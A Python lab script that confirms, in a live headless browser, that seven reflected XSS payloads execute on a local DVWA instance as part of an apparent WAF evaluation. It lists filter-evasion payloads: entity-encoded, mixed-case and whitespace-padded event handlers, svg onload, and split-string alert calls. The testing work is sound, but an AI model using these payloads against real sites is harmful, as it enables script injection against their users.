#!/usr/bin/env python3
"""
Live-origin XSS confirmation for the 7 validated R11 XSS cases.
Machine: KALI. Confirms actual JS execution (alert() firing) by navigating
a real browser (Playwright/Chromium) directly to the live baseline DVWA
origin with an authenticated, security=low session -- NOT by replaying a
saved HTML file offline. Closes the gap flagged in START_HERE.md /
WORK_SYNC_R11_REVIEW.md: "XSS execution was verified by isolated offline
replay for seven cases, not by live-origin browser execution with original
response headers."

Baseline (unprotected) origin only -- http://waf-lab.local:8081, matching
BASE_URLS['baseline'] in legacy_v10.py, exactly what the original R11
baseline evidence used. Does not send anything through any WAF path.

Usage:
  DVWA_PASSWORD=... python3 r11_live_xss_confirmation.py \
      --out evidence/r11-live-xss-confirmation-$(date -u +%Y%m%dT%H%M%SZ)
"""
import argparse, json, os, sys
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import quote

import requests
from playwright.sync_api import sync_playwright

sys.path.insert(0, str(Path(__file__).parent))
from legacy_v10 import login, BASE_URLS

CASES = [
    ("R11-XSS-E01", "<script>alert('W10XSS01')</script>", "W10XSS01"),
    ("R11-XSS-E02", "<img src=x onerror=\"&#x61;&#x6c;&#x65;&#x72;&#x74;('W10XSS02')\">", "W10XSS02"),
    ("R11-XSS-E03", "<img src=x onerror=alert('W10XSS03')>", "W10XSS03"),
    ("R11-XSS-E05", "<img src=x oNeRrOr=alert('W10XSS05')>", "W10XSS05"),
    ("R11-XSS-E06", "<img src=x   ONERROR=alert('W10XSS06')>", "W10XSS06"),
    ("R11-XSS-E07", "<svg/OnLoAd=alert('W10XSS07')>", "W10XSS07"),
    ("R11-XSS-E08", "<img src=x onerror=window['al'+'ert']('W10XSS08')>", "W10XSS08"),
]

def utc_now():
    return datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--out', required=True)
    ap.add_argument('--username', default=os.environ.get('DVWA_USERNAME', 'admin'))
    args = ap.parse_args()
    password = os.environ.get('DVWA_PASSWORD')
    if not password:
        sys.exit('DVWA_PASSWORD is required in the environment; it is never written to evidence.')

    out_dir = Path(args.out)
    if out_dir.exists() and any(out_dir.iterdir()):
        sys.exit(f'Refusing to write into existing non-empty directory: {out_dir}')
    out_dir.mkdir(parents=True, exist_ok=True)

    base_url = BASE_URLS['baseline']
    session = requests.Session()
    auth = login(session, base_url, args.username, password)
    print(f"[live-xss] auth result: {auth}")

    host = base_url.split('//', 1)[1].split(':')[0]
    cookies_for_playwright = [
        {'name': c.name, 'value': c.value, 'domain': host, 'path': '/'}
        for c in session.cookies
    ]
    if not cookies_for_playwright:
        print("[live-xss] WARNING: no session cookies obtained from login; "
              "continuing anyway, but check auth result above.")

    results = []
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        context = browser.new_context()
        context.add_cookies(cookies_for_playwright)
        page = context.new_page()

        for case_id, payload, marker in CASES:
            dialog_state = {'fired': False, 'message': None}

            def on_dialog(dialog, state=dialog_state):
                state['fired'] = True
                state['message'] = dialog.message
                dialog.accept()

            page.on('dialog', on_dialog)

            url = f"{base_url}/DVWA/vulnerabilities/xss_r/index.php?name={quote(payload)}"
            ts_start = utc_now()
            status = None
            error = None
            try:
                resp = page.goto(url, wait_until='load', timeout=15000)
                status = resp.status if resp else None
                page.wait_for_timeout(500)
            except Exception as e:
                error = str(e)
            page.remove_listener('dialog', on_dialog)

            rec = {
                'case_id': case_id,
                'url': url,
                'expected_marker': marker,
                'http_status': status,
                'dialog_fired': dialog_state['fired'],
                'dialog_message': dialog_state['message'],
                'marker_confirmed': bool(dialog_state['message'] and marker in dialog_state['message']),
                'error': error,
                'timestamp_utc': ts_start,
                'method': 'live-origin browser (Playwright/Chromium), authenticated security=low session, baseline (unprotected) origin',
            }
            results.append(rec)
            print(f"{case_id}: dialog_fired={rec['dialog_fired']} marker_confirmed={rec['marker_confirmed']}")

        context.close()
        browser.close()

    with open(out_dir / 'live_xss_manifest.jsonl', 'w') as f:
        for r in results:
            f.write(json.dumps(r) + '\n')

    n_confirmed = sum(1 for r in results if r['marker_confirmed'])
    summary = {
        'generated_utc': utc_now(),
        'base_url': base_url,
        'total_cases': len(results),
        'confirmed': n_confirmed,
        'not_confirmed': len(results) - n_confirmed,
    }
    with open(out_dir / 'summary.json', 'w') as f:
        json.dump(summary, f, indent=2)

    print(f"\n[live-xss] {n_confirmed}/{len(results)} confirmed via live-origin browser execution.")
    print(f"[live-xss] wrote: {out_dir / 'live_xss_manifest.jsonl'}")

if __name__ == '__main__':
    main()
